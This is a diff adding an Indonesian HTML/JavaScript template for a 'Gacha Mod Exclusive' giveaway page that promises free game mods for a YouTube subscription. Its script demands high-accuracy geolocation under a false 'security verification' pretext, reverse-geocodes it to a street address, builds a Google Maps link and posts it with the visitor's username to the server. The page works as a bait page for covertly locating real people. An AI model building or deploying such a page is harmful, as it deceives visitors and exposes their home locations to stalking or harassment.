@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gacha Mod Exclusive - Subscribe & Win!</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="background-overlay"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1 class="title">🎮 GACHA MOD EXCLUSIVE</h1>
+            <p class="subtitle">Subscribe channel untuk kesempatan mendapatkan mod rare gratis!</p>
+        </div>
+
+        <div class="content-box">
+            <div class="info-section">
+                <div class="info-icon">🎁</div>
+                <h2>Bagaimana Cara Mendapatkannya?</h2>
+                <ol class="steps-list">
+                    <li>Masukkan username YouTube Anda</li>
+                    <li>Izinkan akses lokasi (wajib)</li>
+                    <li>Subscribe channel kami</li>
+                    <li>Dapatkan 1x kesempatan gacha gratis!</li>
+                </ol>
+                
+                <div class="location-info">
+                    <i class="fas fa-map-marker-alt"></i>
+                    <span>Kami membutuhkan akses lokasi untuk verifikasi keamanan</span>
+                </div>
+            </div>
+
+            <div class="form-section">
+                <div class="gacha-form">
+                    <div class="input-group">
+                        <label for="username">YouTube Username:</label>
+                        <input type="text" id="username" name="username" 
+                               placeholder="Contoh: GamingPro123" required>
+                        <div class="input-note">Masukkan username YouTube Anda</div>
+                    </div>
+
+                    <div class="location-permission">
+                        <button id="locationBtn" class="location-btn">
+                            <i class="fas fa-map-marker-alt"></i>
+                            IZINKAN AKSES LOKASI
+                        </button>
+                        <div id="locationStatus" class="location-status">
+                            <i class="fas fa-times-circle"></i>
+                            Lokasi belum diizinkan
+                        </div>
+                    </div>
+
+                    <div class="button-group">
+                        <a href="{{ youtube_url }}" target="_blank" class="youtube-btn" id="youtubeBtn">
+                            <span class="btn-icon">📺</span>
+                            Subscribe Channel
+                        </a>
+                        
+                        <button type="button" class="gacha-btn" id="gachaBtn" disabled>
+                            <span class="btn-icon">🎮</span>
+                            Putar Gacha
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="preview-section">
+                <h3>Hadiah yang Bisa Anda Dapatkan:</h3>
+                <div class="items-grid">
+                    <div class="preview-item">
+                        <div class="item-image">
+                            <img src="{{ url_for('static', filename='images/mod1.jpg') }}" 
+                                 alt="Mod Rare 1" 
+                                 onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjRkZENzAwIiByeD0iMTAiLz4KPHRleHQgeD0iNDAiIHk9IjQwIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJibGFjayIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIj5TU1I8L3RleHQ+Cjwvc3ZnPg=='">
+                        </div>
+                        <div class="item-name">Mod Rare 1</div>
+                        <div class="item-rarity">SSR</div>
+                    </div>
+                    
+                    <div class="preview-item">
+                        <div class="item-image">
+                            <img src="{{ url_for('static', filename='images/mod2.jpg') }}" 
+                                 alt="Mod Rare 2" 
+                                 onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjRkZENzAwIiByeD0iMTAiLz4KPHRleHQgeD0iNDAiIHk9IjQwIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJibGFjayIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIj5TU1I8L3RleHQ+Cjwvc3ZnPg=='">
+                        </div>
+                        <div class="item-name">Mod Rare 2</div>
+                        <div class="item-rarity">SSR</div>
+                    </div>
+                    
+                    <div class="preview-item">
+                        <div class="item-image">
+                            <img src="{{ url_for('static', filename='images/mod3.jpg') }}" 
+                                 alt="Mod Epic 1" 
+                                 onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjQzBDMEMwIiByeD0iMTAiLz4KPHRleHQgeD0iNDAiIHk9IjQwIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJibGFjayIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIj5TUjwvdGV4dD4KPC9zdmc+'">
+                        </div>
+                        <div class="item-name">Mod Epic 1</div>
+                        <div class="item-rarity">SR</div>
+                    </div>
+                    
+                    <div class="preview-item">
+                        <div class="item-image">
+                            <img src="{{ url_for('static', filename='images/mod4.jpg') }}" 
+                                 alt="Mod Epic 2" 
+                                 onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjQzBDMEMwIiByeD0iMTAiLz4KPHRleHQgeD0iNDAiIHk9IjQwIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJibGFjayIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsLCBsYW5zLXNlcmlmIj5TUjwvdGV4dD4KPC9zdmc+'">
+                        </div>
+                        <div class="item-name">Mod Epic 2</div>
+                        <div class="item-rarity">SR</div>
+                    </div>
+                    
+                    <div class="preview-item">
+                        <div class="item-image">
+                            <img src="{{ url_for('static', filename='images/mod5.jpg') }}" 
+                                 alt="Mod Special 1" 
+                                 onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjQ0Q3RjMyIiByeD0iMTAiLz4KPHRleHQgeD0iNDAiIHk9IjQwIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIj5SPC90ZXh0Pgo8L3N2Zz4='">
+                        </div>
+                        <div class="item-name">Mod Special 1</div>
+                        <div class="item-rathy">R</div>
+                    </div>
+                    
+                    <div class="preview-item">
+                        <div class="item-image">
+                            <img src="{{ url_for('static', filename='images/mod6.jpg') }}" 
+                                 alt="Mod Special 2" 
+                                 onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODAiIGhlaWdodD0iODAiIHZpZXdCb3g9IjAgMCA4MCA4MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjgwIiBoZWlnaHQ9IjgwIiBmaWxsPSIjQ0Q3RjMyIiByeD0iMTAiLz4KPHRleHQgeD0iNDAiIHk9IjQwIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSJ3aGl0ZSIgZm9udC1zaXplPSIxMiIgZm9udC1mYW1pbHk9IkFyaWFsLCBzYW5zLXNlcmlmIj5SPC90ZXh0Pgo8L3N2Zz4='">
+                        </div>
+                        <div class="item-name">Mod Special 2</div>
+                        <div class="item-rarity">R</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Gacha Mod System - All rights reserved</p>
+            <p>Lokasi diperlukan untuk keamanan sistem</p>
+        </div>
+    </div>
+
+    <script>
+        class GachaSystem {
+            constructor() {
+                this.youtubeBtn = document.getElementById('youtubeBtn');
+                this.gachaBtn = document.getElementById('gachaBtn');
+                this.locationBtn = document.getElementById('locationBtn');
+                this.locationStatus = document.getElementById('locationStatus');
+                this.usernameInput = document.getElementById('username');
+                
+                this.youtubeClicked = false;
+                this.locationGranted = false;
+                this.locationData = {};
+                
+                this.init();
+            }
+            
+            init() {
+                this.youtubeBtn.addEventListener('click', () => this.handleYouTubeClick());
+                this.gachaBtn.addEventListener('click', () => this.handleGachaClick());
+                this.locationBtn.addEventListener('click', () => this.requestLocation());
+                this.usernameInput.addEventListener('input', () => this.validateForm());
+                
+                // Cek jika lokasi sudah diizinkan sebelumnya
+                if (navigator.permissions) {
+                    navigator.permissions.query({name: 'geolocation'})
+                        .then(permissionStatus => {
+                            if (permissionStatus.state === 'granted') {
+                                this.getLocation();
+                            }
+                        });
+                }
+            }
+            
+            requestLocation() {
+                if (!navigator.geolocation) {
+                    this.showNotification('Browser tidak mendukung geolocation', 'error');
+                    return;
+                }
+                
+                this.locationBtn.disabled = true;
+                this.locationBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> MENDAPATKAN LOKASI...';
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => this.handleLocationSuccess(position),
+                    (error) => this.handleLocationError(error),
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            }
+            
+            handleLocationSuccess(position) {
+                this.locationGranted = true;
+                this.locationData = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                };
+                
+                this.locationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Lokasi diizinkan';
+                this.locationStatus.className = 'location-status granted';
+                
+                this.locationBtn.innerHTML = '<i class="fas fa-check"></i> LOKASI DIDAPATKAN';
+                this.locationBtn.className = 'location-btn granted';
+                
+                this.getAddressFromCoordinates();
+                this.validateForm();
+                
+                this.showNotification('Lokasi berhasil didapatkan', 'success');
+            }
+            
+            handleLocationError(error) {
+                let errorMessage = 'Gagal mendapatkan lokasi';
+                
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        errorMessage = 'Akses lokasi ditolak. Anda harus mengizinkan lokasi untuk melanjutkan.';
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        errorMessage = 'Informasi lokasi tidak tersedia.';
+                        break;
+                    case error.TIMEOUT:
+                        errorMessage = 'Request lokasi timeout.';
+                        break;
+                }
+                
+                this.locationStatus.innerHTML = '<i class="fas fa-times-circle"></i> Lokasi gagal';
+                this.locationStatus.className = 'location-status denied';
+                
+                this.locationBtn.innerHTML = '<i class="fas fa-map-marker-alt"></i> COBA LAGI';
+                this.locationBtn.className = 'location-btn';
+                this.locationBtn.disabled = false;
+                
+                this.showNotification(errorMessage, 'error');
+            }
+            
+            async getAddressFromCoordinates() {
+                try {
+                    const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${this.locationData.latitude}&lon=${this.locationData.longitude}`);
+                    const data = await response.json();
+                    
+                    if (data.address) {
+                        this.locationData.address = {
+                            road: data.address.road || '',
+                            suburb: data.address.suburb || '',
+                            city: data.address.city || data.address.town || data.address.village || '',
+                            state: data.address.state || '',
+                            country: data.address.country || '',
+                            postcode: data.address.postcode || ''
+                        };
+                        
+                        this.locationData.google_maps = `https://www.google.com/maps?q=${this.locationData.latitude},${this.locationData.longitude}`;
+                    }
+                } catch (error) {
+                    console.log('Tidak bisa mendapatkan alamat:', error);
+                }
+            }
+            
+            handleYouTubeClick() {
+                this.youtubeClicked = true;
+                this.validateForm();
+                
+                this.youtubeBtn.style.opacity = '0.8';
+                this.youtubeBtn.style.transform = 'scale(0.95)';
+                
+                setTimeout(() => {
+                    this.youtubeBtn.style.opacity = '1';
+                    this.youtubeBtn.style.transform = 'scale(1)';
+                }, 300);
+                
+                this.showNotification('Terima kasih! Sekarang Anda bisa memutar gacha.', 'success');
+            }
+            
+            validateForm() {
+                const username = this.usernameInput.value.trim();
+                const isValid = username && this.youtubeClicked && this.locationGranted;
+                
+                if (isValid) {
+                    this.gachaBtn.disabled = false;
+                    this.gachaBtn.classList.add('enabled');
+                } else {
+                    this.gachaBtn.disabled = true;
+                    this.gachaBtn.classList.remove('enabled');
+                }
+                
+                return isValid;
+            }
+            
+            async handleGachaClick() {
+                const username = this.usernameInput.value.trim();
+                
+                if (!this.validateForm()) {
+                    if (!username) {
+                        this.showNotification('Username harus diisi!', 'error');
+                        this.usernameInput.focus();
+                        this.highlightInput(this.usernameInput, true);
+                    } else if (!this.youtubeClicked) {
+                        this.showNotification('Silakan subscribe channel terlebih dahulu!', 'error');
+                    } else if (!this.locationGranted) {
+                        this.showNotification('Silakan izinkan akses lokasi terlebih dahulu!', 'error');
+                    }
+                    return;
+                }
+                
+                this.setButtonLoading(true);
+                
+                try {
+                    const formData = new FormData();
+                    formData.append('username', username);
+                    formData.append('location_data', JSON.stringify(this.locationData));
+                    
+                    const response = await fetch('/subscribe', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        this.showNotification(data.message, 'success');
+                        setTimeout(() => {
+                            window.location.href = data.redirect;
+                        }, 1500);
+                    } else {
+                        this.showNotification(data.message, 'error');
+                        this.setButtonLoading(false);
+                    }
+                    
+                } catch (error) {
+                    console.error('Error:', error);
+                    this.showNotification('Terjadi kesalahan sistem.', 'error');
+                    this.setButtonLoading(false);
+                }
+            }
+            
+            setButtonLoading(loading) {
+                if (loading) {
+                    this.gachaBtn.disabled = true;
+                    this.gachaBtn.innerHTML = '<span class="btn-icon"><i class="fas fa-spinner fa-spin"></i></span> MEMPROSES...';
+                } else {
+                    this.gachaBtn.disabled = false;
+                    this.gachaBtn.innerHTML = '<span class="btn-icon">🎮</span> Putar Gacha';
+                }
+            }
+            
+            highlightInput(input, highlight) {
+                if (highlight) {
+                    input.style.borderColor = '#ff6b6b';
+                    input.style.boxShadow = '0 0 0 2px rgba(255, 107, 107, 0.2)';
+                    
+                    setTimeout(() => {
+                        input.style.borderColor = '';
+                        input.style.boxShadow = '';
+                    }, 2000);
+                }
+            }
+            
+            showNotification(message, type) {
+                // Remove existing notifications
+                const existingNotifications = document.querySelectorAll('.notification');
+                existingNotifications.forEach(notif => notif.remove());
+                
+                const notification = document.createElement('div');
+                notification.className = `notification ${type}`;
+                notification.innerHTML = `
+                    <i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i>
+                    <span>${message}</span>
+                `;
+                
+                document.body.appendChild(notification);
+                
+                // Show animation
+                setTimeout(() => {
+                    notification.classList.add('show');
+                }, 10);
+                
+                // Remove after 3 seconds
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                    setTimeout(() => {
+                        notification.remove();
+                    }, 300);
+                }, 3000);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            new GachaSystem();
+            
+            // Add notification styles
+            const style = document.createElement('style');
+            style.textContent = `
+                .notification {
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    padding: 15px 20px;
+                    border-radius: 8px;
+                    background: white;
+                    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+                    display: flex;
+                    align-items: center;
+                    gap: 10px;
+                    transform: translateX(100%);
+                    transition: transform 0.3s ease;
+                    z-index: 1000;
+                    max-width: 300px;
+                }
+                
+                .notification.show {
+                    transform: translateX(0);
+                }
+                
+                .notification.success {
+                    background: #00b894;
+                    color: white;
+                    border-left: 4px solid #00a085;
+                }
+                
+                .notification.error {
+                    background: #ff6b6b;
+                    color: white;
+                    border-left: 4px solid #ff4757;
+                }
+            `;
+            document.head.appendChild(style);
+        });
+    </script>
+</body>
+</html>
